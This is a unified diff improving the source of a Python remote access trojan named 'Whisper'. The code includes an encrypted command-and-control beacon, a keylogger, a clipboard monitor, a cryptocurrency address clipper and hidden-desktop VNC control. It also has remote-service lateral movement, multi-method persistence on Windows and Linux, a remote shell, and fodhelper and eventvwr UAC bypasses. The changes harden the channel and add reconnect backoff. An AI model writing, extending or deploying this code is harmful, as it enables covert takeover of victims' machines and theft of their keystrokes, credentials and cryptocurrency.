@@ -1,24 +1,32 @@
-import socket, base64, json, os, sys, struct, hashlib, hmac, time, threading, subprocess, platform
+import socket, base64, json, os, sys, struct, hashlib, hmac, time, threading, subprocess, platform, secrets, random
 
 C2_HOST = '127.0.0.1'
 C2_PORT = 4443
 ENCRYPTION_PASSWORD = 'whisper_secret_key'
 RECONNECT_DELAY = 10
+C2_SALT_HEX = '10acb68ee84048bb104574c42fcdea61'
+_MAX_BACKOFF = 3600
 
-def _k(): return hashlib.pbkdf2_hmac("sha256", ENCRYPTION_PASSWORD.encode(), b"whisper_salt_2024", 100000, 32)
+def _salt(): return bytes.fromhex(C2_SALT_HEX)
+def _k(): return hashlib.pbkdf2_hmac("sha256", ENCRYPTION_PASSWORD.encode(), _salt(), 600000, 32)
+
 def _eb(p, k):
     iv = os.urandom(16); ks, c = b"", 0
     while len(ks) < len(p):
         ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
     ct = bytes(x ^ y for x, y in zip(p, ks))
-    return iv + hmac.new(k, iv + ct, hashlib.sha256).digest()[:16] + ct
+    return b"\x00" + iv + hmac.new(k, iv + ct, hashlib.sha256).digest()[:16] + ct
+
 def _db(d, k):
+    if not d or d[0] != 0: raise ValueError("bad cipher version")
+    d = d[1:]
     iv, tag, ct = d[:16], d[16:32], d[32:]
     if not hmac.compare_digest(tag, hmac.new(k, iv + ct, hashlib.sha256).digest()[:16]): raise ValueError("integrity")
     ks, c = b"", 0
     while len(ks) < len(ct):
         ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
     return bytes(x ^ y for x, y in zip(ct, ks))
+
 def enc(d): return base64.b64encode(_eb(json.dumps(d).encode(), _k()))
 def dec(d): return json.loads(_db(base64.b64decode(d), _k()))
 def rms(s):
@@ -322,35 +330,35 @@ def _cmd_clipboard_get(m):
         return {"output": "[!] No text on clipboard"}
     except Exception as e: return {"output": f"[!] Clipboard error: {e}"}
 
-_clip_monitor_run = [False]
-_clip_log = []
+_clip_state = {"run": False, "log": []}
 
 def _clip_monitor_thread():
     last = None
-    while _clip_monitor_run[0]:
+    while _clip_state["run"]:
         try:
             text = _get_clipboard_text()
             if text and text != last:
                 last = text
-                _clip_log.append(text[:500])
-        except: pass
+                _clip_state["log"].append(text[:500])
+        except:
+            pass
         time.sleep(1)
 
 def _cmd_clipboard_monitor(m):
     try:
         action = m.get("action", "start")
         if action == "start":
-            if _clip_monitor_run[0]: return {"output": "[!] Clipboard monitor already running"}
-            _clip_monitor_run[0] = True
-            _clip_log.clear()
+            if _clip_state["run"]: return {"output": "[!] Clipboard monitor already running"}
+            _clip_state["run"] = True
+            _clip_state["log"].clear()
             threading.Thread(target=_clip_monitor_thread, daemon=True).start()
             return {"output": "[+] Clipboard monitor started"}
         elif action == "stop":
-            _clip_monitor_run[0] = False
+            _clip_state["run"] = False
             return {"output": "[+] Clipboard monitor stopped"}
         elif action == "dump":
-            logs = list(_clip_log)
-            _clip_log.clear()
+            logs = list(_clip_state["log"])
+            _clip_state["log"].clear()
             return {"output": "\n".join(logs[-20:]) if logs else "[!] No clipboard captures"}
         return {"output": "[!] Use action=start/stop/dump"}
     except Exception as e: return {"output": f"[!] Clipboard monitor error: {e}"}
@@ -390,7 +398,7 @@ _REPLACE_ADDRS = {
     "dash": "Xx4Q8g7Jf3Kp9Lm2Nv5Rw8Yb1Cs4Dg6Hj",
 }
 
-_clipper_run = [False]
+_clipper_run = False
 
 def _clip_get():
     try:
@@ -420,20 +428,23 @@ def _replace_addresses(text, overrides=None):
     return replaced, found
 
 def _clipper_thread(overrides):
-    while _clipper_run[0]:
+    global _clipper_run
+    while _clipper_run:
         try:
             text = _clip_get()
             if text:
                 new_text, found = _replace_addresses(text, overrides)
                 if found and new_text != text:
                     _clip_set(new_text)
-        except: pass
+        except:
+            pass
         time.sleep(0.5)
 
 def _cmd_clipper_start(m):
+    global _clipper_run
     try:
-        if _clipper_run[0]: return {"output": "[!] Clipper already running"}
-        _clipper_run[0] = True
+        if _clipper_run: return {"output": "[!] Clipper already running"}
+        _clipper_run = True
         overrides = {}
         for coin in _REPLACEMENTS:
             if coin in m: overrides[coin] = m[coin]
@@ -442,7 +453,8 @@ def _cmd_clipper_start(m):
     except Exception as e: return {"output": f"[!] Clipper error: {e}"}
 
 def _cmd_clipper_stop(m):
-    _clipper_run[0] = False; return {"output": "[+] Crypto clipper stopped"}
+    global _clipper_run
+    _clipper_run = False; return {"output": "[+] Crypto clipper stopped"}
 
 def _cmd_clipper_test(m):
     try:
@@ -767,15 +779,16 @@ def _cmd_delete(m):
 def _cmd_execute(m):
     try:
         p = m["path"]
-        args = m.get("args", "")
+        arg_str = m.get("args", "")
         wait = m.get("wait", False)
-        cmd = f'"{p}" {args}'.strip()
+        import shlex
+        cmd_parts = [p] + (shlex.split(arg_str) if arg_str else [])
         if wait:
-            r = subprocess.run(cmd, shell=True, capture_output=True, timeout=int(m.get("timeout", 30)))
+            r = subprocess.run(cmd_parts, capture_output=True, timeout=int(m.get("timeout", 30)))
             out = r.stdout.decode(errors="replace") + r.stderr.decode(errors="replace")
             return {"output": out[:5000] if out else f"[+] Executed (exit={r.returncode})"}
         else:
-            subprocess.Popen(cmd, shell=True, close_fds=True)
+            subprocess.Popen(cmd_parts, close_fds=True)
             return {"output": f"[+] Started: {p}"}
     except subprocess.TimeoutExpired: return {"output": "[!] Execution timed out"}
     except Exception as e: return {"output": f"[!] Execute failed: {e}"}
@@ -819,41 +832,84 @@ _CMDS["search"] = _cmd_search
 
 # --- hvnc plugin ---
 
-_hvnc_name = "Whisper_HVNC_" + str(os.getpid())
-_hvnc_desk = None
-_hvnc_run = [False]
-_DESKTOP_ACCESS = 0x1000
+_hvnc_state = {"desk": None, "run": False, "proc": None, "name": None}
+_HVNC_ACCESS_MASKS = [0x01FF, 0x1000, 0x0100]
 
-def _hvnc_thread():
-    global _hvnc_desk
+def _hvnc_create():
     import ctypes
     u32 = ctypes.windll.user32
-    desk = u32.CreateDesktopW(_hvnc_name, None, None, 0, _DESKTOP_ACCESS, None)
+    for mask in _HVNC_ACCESS_MASKS:
+        desk = u32.CreateDesktopW(_hvnc_state["name"], None, None, 0, mask, None)
+        if desk: return desk
+    return None
+
+def _hvnc_thread():
+    import ctypes
+    u32 = ctypes.windll.user32
+    desk = _hvnc_create()
     if not desk:
-        _hvnc_desk = None; _hvnc_run[0] = False; return
-    _hvnc_desk = desk; _hvnc_run[0] = True
+        _hvnc_state["desk"] = None; _hvnc_state["run"] = False; return
+    _hvnc_state["desk"] = desk; _hvnc_state["run"] = True
     try:
         si = subprocess.STARTUPINFO()
-        si.lpDesktop = _hvnc_name
-        subprocess.Popen(["explorer.exe"], startupinfo=si, close_fds=True)
-        while _hvnc_run[0] and desk:
+        si.lpDesktop = _hvnc_state["name"]
+        proc = subprocess.Popen(["explorer.exe"], startupinfo=si, close_fds=True)
+        _hvnc_state["proc"] = proc
+        while _hvnc_state["run"] and desk:
             time.sleep(2)
     finally:
+        if _hvnc_state["proc"]:
+            try:
+                _hvnc_state["proc"].kill()
+                _hvnc_state["proc"].wait(timeout=5)
+            except:
+                pass
+            _hvnc_state["proc"] = None
         if desk: u32.CloseDesktop(desk)
-        _hvnc_desk = None; _hvnc_run[0] = False
+        _hvnc_state["desk"] = None; _hvnc_state["run"] = False
 
 def _cmd_hvnc_start(m):
-    if _hvnc_run[0]: return {"output": "[!] HVNC already running"}
+    if _hvnc_state["run"]: return {"output": "[!] HVNC already running"}
+    _hvnc_state["name"] = "Whisper_HVNC_" + str(os.getpid())
     import ctypes
+    k32 = ctypes.windll.kernel32
+    u32 = ctypes.windll.user32
+    wst = u32.GetProcessWindowStation()
+    if not wst: return {"output": "[!] HVNC fails: no window station (process may be a service)"}
     if not ctypes.windll.shell32.IsUserAnAdmin():
         return {"output": "[!] HVNC requires admin. Use uac_bypass command first to spawn an elevated agent, then use HVNC on that new client."}
     threading.Thread(target=_hvnc_thread, daemon=True).start()
-    time.sleep(0.5)
-    if _hvnc_desk: return {"output": f"[+] HVNC started on desktop '{_hvnc_name}'"}
-    return {"output": "[!] HVNC failed - create desktop failed (need interactive session with desktop creation rights)"}
+    for _ in range(10):
+        if _hvnc_state["desk"]: break
+        time.sleep(0.1)
+    if _hvnc_state["desk"]:
+        k32.SetThreadExecutionState(0x80000003)
+        return {"output": f"[+] HVNC started on desktop '{_hvnc_state['name']}'"}
+    err = k32.GetLastError()
+    return {"output": f"[!] HVNC failed (error {err}). Need interactive RDP/console session - not service/headless server."}
+
+def _cmd_hvnc_diag(m):
+    import ctypes
+    k32 = ctypes.windll.kernel32; u32 = ctypes.windll.user32
+    lines = []
+    wst = u32.GetProcessWindowStation()
+    lines.append(f"WindowStation: {wst}")
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+    lines.append(f"Admin: {is_admin}")
+    sid = ctypes.c_ulong()
+    k32.ProcessIdToSessionId(k32.GetCurrentProcessId(), ctypes.byref(sid))
+    lines.append(f"Session: {sid.value}")
+    desk = u32.OpenInputDesktop(0, False, 0x0100)
+    lines.append(f"InputDesktop: {desk}")
+    if desk: u32.CloseDesktop(desk)
+    for mask in _HVNC_ACCESS_MASKS:
+        d = u32.CreateDesktopW("_hvnc_diag_" + str(os.getpid()), None, None, 0, mask, None)
+        lines.append(f"CreateDesktop(0x{mask:04X}): {d}")
+        if d: u32.CloseDesktop(d); break
+    return {"output": "[+] HVNC diag:\n  " + "\n  ".join(lines)}
 
 def _cmd_hvnc_stop(m):
-    _hvnc_run[0] = False; return {"output": "[+] HVNC stopped"}
+    _hvnc_state["run"] = False; return {"output": "[+] HVNC stopped"}
 
 def _ss_gdi(desk_handle=None):
     try:
@@ -887,20 +943,22 @@ def _ss_gdi(desk_handle=None):
 
 def _cmd_hvnc_screenshot(m):
     try:
-        if not _hvnc_desk: return {"output": "[!] HVNC not running"}
-        bmp = _ss_gdi(_hvnc_desk)
+        desk = _hvnc_state["desk"]
+        if not desk: return {"output": "[!] HVNC not running"}
+        bmp = _ss_gdi(desk)
         if bmp: return {"data": base64.b64encode(bmp).decode()}
         return {"output": "[!] HVNC screenshot failed"}
     except Exception as e: return {"output": f"[!] HVNC screenshot: {e}"}
 
 def _cmd_hvnc_stream(m):
     try:
-        if not _hvnc_desk: return {"output": "[!] HVNC not running"}
+        desk = _hvnc_state["desk"]
+        if not desk: return {"output": "[!] HVNC not running"}
         count = min(m.get("count", 5), 20)
         delay = max(min(m.get("delay", 1), 5), 0.5)
         images = []
         for i in range(count):
-            bmp = _ss_gdi(_hvnc_desk)
+            bmp = _ss_gdi(desk)
             if bmp: images.append(base64.b64encode(bmp).decode())
             time.sleep(delay)
         return {"data": images, "count": len(images)} if images else {"output": "[!] HVNC stream failed"}
@@ -910,9 +968,10 @@ def _hvnc_send_input(input_type, flags, data, extra=0):
     try:
         import ctypes
         u32 = ctypes.windll.user32
-        if not _hvnc_desk: return False
+        desk = _hvnc_state["desk"]
+        if not desk: return False
         cur = u32.OpenInputDesktop(0, False, 0x0100)
-        if not u32.SwitchDesktop(_hvnc_desk):
+        if not u32.SwitchDesktop(desk):
             if cur: u32.CloseDesktop(cur)
             return False
         ctypes.windll.kernel32.Sleep(50)
@@ -970,6 +1029,7 @@ def _cmd_hvnc_key(m):
 
 _CMDS["hvnc_start"] = _cmd_hvnc_start
 _CMDS["hvnc_stop"] = _cmd_hvnc_stop
+_CMDS["hvnc_diag"] = _cmd_hvnc_diag
 _CMDS["hvnc_screenshot"] = _cmd_hvnc_screenshot
 _CMDS["hvnc_stream"] = _cmd_hvnc_stream
 _CMDS["hvnc_mouse"] = _cmd_hvnc_mouse
@@ -978,34 +1038,34 @@ _CMDS["hvnc_key"] = _cmd_hvnc_key
 
 # --- keylogger plugin ---
 
-_kl_keys = []; _kl_run = [False]
+_kl_state = {"keys": [], "run": False}
 def _kl_thread():
-    _kl_run[0] = True
+    _kl_state["run"] = True
     if platform.system() == "Windows":
         from ctypes import windll
-        while _kl_run[0]:
+        while _kl_state["run"]:
             for c in range(255):
-                if windll.user32.GetAsyncKeyState(c) & 1: _kl_keys.append(c)
+                if windll.user32.GetAsyncKeyState(c) & 1: _kl_state["keys"].append(c)
             time.sleep(0.01)
     elif platform.system() == "Linux":
         try:
             from pynput import keyboard
             def _kp(k):
-                try: _kl_keys.append(k.char)
-                except: _kl_keys.append(f"[{k}]")
+                try: _kl_state["keys"].append(k.char)
+                except: _kl_state["keys"].append(f"[{k}]")
             with keyboard.Listener(on_press=_kp) as l: l.join()
         except: pass
-    _kl_run[0] = False
+    _kl_state["run"] = False
 
 def _cmd_keylog_start(m):
-    if not _kl_run[0]: threading.Thread(target=_kl_thread, daemon=True).start(); return {"output": "[+] Keylogger started"}
+    if not _kl_state["run"]: threading.Thread(target=_kl_thread, daemon=True).start(); return {"output": "[+] Keylogger started"}
     return {"output": "[!] Already running"}
 
 def _cmd_keylog_stop(m):
-    _kl_run[0] = False; return {"output": "[+] Keylogger stopped"}
+    _kl_state["run"] = False; return {"output": "[+] Keylogger stopped"}
 
 def _cmd_keylog_get(m):
-    o = "".join(str(c) if isinstance(c, int) else c for c in _kl_keys); _kl_keys.clear()
+    o = "".join(str(c) if isinstance(c, int) else c for c in _kl_state["keys"]); _kl_state["keys"].clear()
     return {"output": o or "(no keys captured)"}
 _CMDS["keylog_start"] = _cmd_keylog_start; _CMDS["keylog_stop"] = _cmd_keylog_stop; _CMDS["keylog_get"] = _cmd_keylog_get
 
@@ -1020,20 +1080,22 @@ def _cmd_psexec(m):
     r = []
     try:
         if u and p:
-            subprocess.run(f'net use \\\\{t}\\ADMIN$ {p} /user:{u}', shell=True, capture_output=True, timeout=10)
+            unc_path = f"\\\\{t}\\ADMIN$"
+            subprocess.run(["net", "use", unc_path, p, "/user:" + u], capture_output=True, timeout=10)
             r.append("auth")
         tmp = "%TEMP%\\whisper_psexec.exe"
         if m.get("upload"):
             with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as f:
                 f.write(base64.b64decode(m["upload"]))
                 local = f.name
-            subprocess.run(f'copy "{local}" \\\\{t}\\ADMIN${tmp}', shell=True, capture_output=True, timeout=15)
+            subprocess.run(["cmd.exe", "/c", "copy", local, f"\\\\{t}\\ADMIN${tmp}"], capture_output=True, timeout=15)
             os.remove(local)
             r.append("copied")
-        subprocess.run(f'sc \\\\{t} create Whisper_PSEXEC binPath= "{tmp}" start= demand', shell=True, capture_output=True, timeout=10)
-        subprocess.run(f'sc \\\\{t} start Whisper_PSEXEC', shell=True, capture_output=True, timeout=15)
-        subprocess.run(f'sc \\\\{t} delete Whisper_PSEXEC', shell=True, capture_output=True, timeout=10)
-        out = subprocess.run(f'wmic /node:{t} process call create "cmd /c {c} > %TEMP%\\whisper_out.txt 2>&1"', shell=True, capture_output=True, timeout=30, text=True)
+        remote_svc = f"\\\\{t}"
+        subprocess.run(["sc", remote_svc, "create", "Whisper_PSEXEC", f"binPath={tmp}", "start=demand"], capture_output=True, timeout=10)
+        subprocess.run(["sc", remote_svc, "start", "Whisper_PSEXEC"], capture_output=True, timeout=15)
+        subprocess.run(["sc", remote_svc, "delete", "Whisper_PSEXEC"], capture_output=True, timeout=10)
+        subprocess.run(["wmic", f"/node:{t}", "process", "call", "create", f"cmd /c {c} > %TEMP%\\whisper_out.txt 2>&1"], capture_output=True, timeout=30, text=True)
         r.append("done")
     except Exception as e: r.append(f"error: {e}")
     return {"output": f"[+] PsExec: {', '.join(r)}"}
@@ -1106,65 +1168,65 @@ def _cmd_persist(m):
             name = m.get("name", "Whisper")
 
             if action == "install":
-                # Registry Run keys
                 for hive, key in [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                                   (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
                     try:
                         with winreg.OpenKey(hive, key, 0, winreg.KEY_SET_VALUE) as k:
                             winreg.SetValueEx(k, name, 0, winreg.REG_SZ, sp)
                         r.append("HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "HKCU")
-                    except: pass
-                # Startup Folder
+                    except:
+                        pass
                 sf = os.path.join(os.environ.get("APPDATA",""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                 try:
                     os.makedirs(sf, exist_ok=True)
                     with open(os.path.join(sf, f"{name}.bat"), "w") as f:
                         f.write(f'@start "" "{sp}"')
                     r.append("Startup")
-                except: pass
-                # WMI
+                except:
+                    pass
                 try:
-                    subprocess.run(f'wmic startup call create "{sp}", "{name}"', shell=True, capture_output=True, timeout=10)
+                    subprocess.run(["wmic", "startup", "call", "create", sp, name], capture_output=True, timeout=10)
                     r.append("WMI")
-                except: pass
-                # Scheduled Task (run on logon)
+                except:
+                    pass
                 try:
-                    subprocess.run(f'schtasks /create /tn "{name}" /tr "{sp}" /sc onlogon /ru "%%USERNAME%%" /f', shell=True, capture_output=True, timeout=15)
+                    subprocess.run(["schtasks", "/create", "/tn", name, "/tr", sp, "/sc", "onlogon", "/ru", "%%USERNAME%%", "/f"], capture_output=True, timeout=15)
                     r.append("SchedTask")
-                except: pass
-                # Windows Service (via sc)
+                except:
+                    pass
                 try:
                     svc_name = f"{name}Svc"
-                    subprocess.run(f'sc create "{svc_name}" binPath= "{sp}" start= auto', shell=True, capture_output=True, timeout=10)
-                    subprocess.run(f'sc description "{svc_name}" "Service"', shell=True, capture_output=True, timeout=10)
+                    subprocess.run(["sc", "create", svc_name, "binPath=", sp, "start=", "auto"], capture_output=True, timeout=10)
+                    subprocess.run(["sc", "description", svc_name, "Service"], capture_output=True, timeout=10)
                     r.append("Service")
-                except: pass
+                except:
+                    pass
                 return {"output": f"[+] Persistence: {', '.join(r) if r else 'failed'}"}
 
-            else:  # remove
-                # Registry
+            else:
                 for hive, key in [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                                   (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")]:
                     try:
                         with winreg.OpenKey(hive, key, 0, winreg.KEY_SET_VALUE) as k:
                             winreg.DeleteValue(k, name)
                         r.append(f"Removed HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "Removed HKCU")
-                    except: pass
-                # Startup
+                    except:
+                        pass
                 try:
                     os.remove(os.path.join(os.environ.get("APPDATA",""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", f"{name}.bat"))
                     r.append("Removed Startup")
-                except: pass
-                # Scheduled Task
+                except:
+                    pass
                 try:
-                    subprocess.run(f'schtasks /delete /tn "{name}" /f', shell=True, capture_output=True, timeout=10)
+                    subprocess.run(["schtasks", "/delete", "/tn", name, "/f"], capture_output=True, timeout=10)
                     r.append("Removed SchedTask")
-                except: pass
-                # Service
+                except:
+                    pass
                 try:
-                    subprocess.run(f'sc delete "{name}Svc"', shell=True, capture_output=True, timeout=10)
+                    subprocess.run(["sc", "delete", f"{name}Svc"], capture_output=True, timeout=10)
                     r.append("Removed Service")
-                except: pass
+                except:
+                    pass
                 return {"output": f"[+] Persistence removed: {', '.join(r) if r else 'nothing found'}"}
 
         elif platform.system() == "Linux":
@@ -1178,21 +1240,26 @@ def _cmd_persist(m):
                         f.write(f"[Desktop Entry]\nType=Application\nName=Whisper\nExec=python3 {sp}\n")
                     r.append("autostart")
                 try:
-                    subprocess.run(f'(crontab -l 2>/dev/null; echo "@reboot python3 {sp}") | crontab -', shell=True, timeout=10)
+                    crontab_in = subprocess.check_output(["crontab", "-l"], timeout=5, stderr=subprocess.DEVNULL).decode()
+                    new_entry = f"@reboot python3 {sp}\n{crontab_in}"
+                    subprocess.run(["crontab", "-"], input=new_entry.encode(), timeout=5)
                     r.append("crontab")
-                except: pass
+                except:
+                    pass
             else:
                 for d in [os.path.join(h,".config","autostart")]:
                     try:
                         os.remove(os.path.join(d,"whisper.desktop"))
                         r.append("Removed autostart")
-                    except: pass
+                    except:
+                        pass
                 try:
                     out = subprocess.check_output(["crontab","-l"], timeout=5).decode()
                     new = "\n".join(l for l in out.split("\n") if sp not in l)
-                    subprocess.run(f"crontab -", input=new, shell=True, timeout=5)
+                    subprocess.run(["crontab", "-"], input=new.encode(), timeout=5)
                     r.append("Removed crontab")
-                except: pass
+                except:
+                    pass
             return {"output": f"[+] Persistence: {', '.join(r)}"}
 
         elif platform.system() == "Darwin":
@@ -1222,12 +1289,13 @@ def _cmd_persist_check(m):
                     with winreg.OpenKey(hive, key, 0, winreg.KEY_READ) as k:
                         val, _ = winreg.QueryValueEx(k, "Whisper")
                         r.append(f"Registry ({'HKLM' if hive == winreg.HKEY_LOCAL_MACHINE else 'HKCU'}): {val}")
-                except: pass
-            import subprocess
+                except:
+                    pass
             try:
-                out = subprocess.check_output(f'schtasks /query /tn "Whisper" /fo LIST', shell=True, timeout=10, creationflags=0x08000000, stderr=subprocess.DEVNULL).decode(errors="replace")
+                out = subprocess.check_output(["schtasks", "/query", "/tn", "Whisper", "/fo", "LIST"], timeout=10, stderr=subprocess.DEVNULL).decode(errors="replace")
                 r.append("Scheduled Task: " + out.split("\n")[0][:80])
-            except: pass
+            except:
+                pass
             return {"output": "\n".join(r) if r else "[!] No persistence found"}
         return {"output": "[!] Check not supported on this OS"}
     except Exception as e: return {"output": f"[!] Persist check error: {e}"}
@@ -1705,7 +1773,12 @@ _CMDS["screenshot"] = _cmd_screenshot
 
 def _cmd_shell(m):
     try:
-        r = subprocess.run(m["cmd"], shell=True, capture_output=True, text=True, timeout=120)
+        cmd = m["cmd"]
+        import platform as _pf
+        if _pf.system() == "Windows":
+            r = subprocess.run(["cmd.exe", "/c", cmd], capture_output=True, text=True, timeout=120)
+        else:
+            r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, text=True, timeout=120)
         return {"output": (r.stdout + r.stderr) or "(no output)"}
     except subprocess.TimeoutExpired: return {"output": "[!] Timed out"}
     except Exception as e: return {"output": f"[!] {e}"}
@@ -1735,17 +1808,22 @@ def _uac_elevated_cmd():
             "import socket,base64,json,os,sys,struct,hashlib,hmac,time,threading,subprocess,platform\n"
             f"C2_HOST={C2_HOST!r};C2_PORT={C2_PORT}\n"
             f"ENCRYPTION_PASSWORD={ENCRYPTION_PASSWORD!r}\n"
-            f"RECONNECT_DELAY={RECONNECT_DELAY}\n\n"
-            "def _k(): return hashlib.pbkdf2_hmac('sha256',ENCRYPTION_PASSWORD.encode(),b'whisper_salt_2024',100000,32)\n"
+            f"RECONNECT_DELAY={RECONNECT_DELAY}\n"
+            "C2_SALT_HEX=''\n\n"
+            "def _k(): return hashlib.pbkdf2_hmac('sha256',ENCRYPTION_PASSWORD.encode(),_salt(),600000,32)\n"
+            "def _salt(): return bytes.fromhex(C2_SALT_HEX) if hasattr(C2_SALT_HEX,'__iter__') and C2_SALT_HEX else b'whisper_salt_2024'\n"
             "def _eb(p,k):\n"
             "    iv=os.urandom(16);ks=b'';c=0\n"
             "    while len(ks)<len(p):\n"
             "        ks+=hmac.new(k,iv+struct.pack('>Q',c),hashlib.sha256).digest();c+=1\n"
-            "    return iv+hmac.new(k,iv+bytes(x^y for x,y in zip(p,ks)),hashlib.sha256).digest()[:16]+bytes(x^y for x,y in zip(p,ks))\n"
+            "    ct=bytes(x^y for x,y in zip(p,ks))\n"
+            "    return b'\\x00'+iv+hmac.new(k,iv+ct,hashlib.sha256).digest()[:16]+ct\n"
             "def _db(d,k):\n"
+            "    if not d or d[0]!=0:raise ValueError('bad cipher')\n"
+            "    d=d[1:]\n"
             "    iv,tag,ct=d[:16],d[16:32],d[32:]\n"
             "    if not hmac.compare_digest(tag,hmac.new(k,iv+ct,hashlib.sha256).digest()[:16]):raise ValueError('integrity')\n"
-            "    ks,b''=b'',0\n"
+            "    ks,c=b'',0\n"
             "    while len(ks)<len(ct):\n"
             "        ks+=hmac.new(k,iv+struct.pack('>Q',c),hashlib.sha256).digest();c+=1\n"
             "    return bytes(x^y for x,y in zip(ct,ks))\n"
@@ -1793,7 +1871,7 @@ def _uac_fodhelper():
         with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as k:
             winreg.SetValueEx(k, "", 0, winreg.REG_SZ, cmd)
             winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
-        subprocess.Popen(["fodhelper.exe"], shell=True, close_fds=True)
+        subprocess.Popen(["fodhelper.exe"], close_fds=True)
         time.sleep(2)
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings", 0, winreg.KEY_WRITE) as k:
             winreg.DeleteKey(k, r"shell\open\command")
@@ -1807,7 +1885,7 @@ def _uac_eventvwr():
         key_path = r"Software\Classes\mscfile\shell\open\command"
         with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as k:
             winreg.SetValueEx(k, "", 0, winreg.REG_SZ, cmd)
-        subprocess.Popen(["eventvwr.exe"], shell=True, close_fds=True)
+        subprocess.Popen(["eventvwr.exe"], close_fds=True)
         time.sleep(2)
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\mscfile", 0, winreg.KEY_WRITE) as k:
             winreg.DeleteKey(k, r"shell\open\command")
@@ -1995,6 +2073,7 @@ _CMDS['execute'] = _cmd_execute
 _CMDS['search'] = _cmd_search
 _CMDS['hvnc_start'] = _cmd_hvnc_start
 _CMDS['hvnc_stop'] = _cmd_hvnc_stop
+_CMDS['hvnc_diag'] = _cmd_hvnc_diag
 _CMDS['hvnc_screenshot'] = _cmd_hvnc_screenshot
 _CMDS['hvnc_stream'] = _cmd_hvnc_stream
 _CMDS['hvnc_mouse'] = _cmd_hvnc_mouse
@@ -2024,11 +2103,18 @@ def _cmd_info(m):
     return {"os":platform.platform(),"hostname":platform.node(),"user":os.environ.get("USERNAME") or os.environ.get("USER") or "unknown","arch":platform.machine(),"pid":os.getpid(),"cwd":os.getcwd()}
 _CMDS["info"] = _cmd_info
 
+def _backoff_delay(attempt):
+    delay = min(RECONNECT_DELAY * (2 ** attempt), _MAX_BACKOFF)
+    jitter = random.uniform(0, delay * 0.1)
+    return delay + jitter
+
 def _main():
+    _attempt = 0
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(30); s.connect((C2_HOST, C2_PORT))
+            _attempt = 0
             sms(s, {"type":"init","os":platform.platform(),"hostname":platform.node(),"user":os.environ.get("USERNAME") or os.environ.get("USER") or "unknown","arch":platform.machine(),"pid":os.getpid()})
             s.settimeout(15)
             while True:
@@ -2056,11 +2142,15 @@ def _main():
                     except Exception as e: sms(s, {"type":"response","error":str(e)})
                 else:
                     sms(s, {"type":"response","error":f"Unknown command: {m['type']}"})
-        except: pass
+        except:
+            pass
         finally:
             try: s.close()
-            except: pass
-        time.sleep(RECONNECT_DELAY)
+            except:
+                pass
+        delay = _backoff_delay(_attempt)
+        _attempt += 1
+        time.sleep(delay)
 
 if __name__ == "__main__":
     _main()
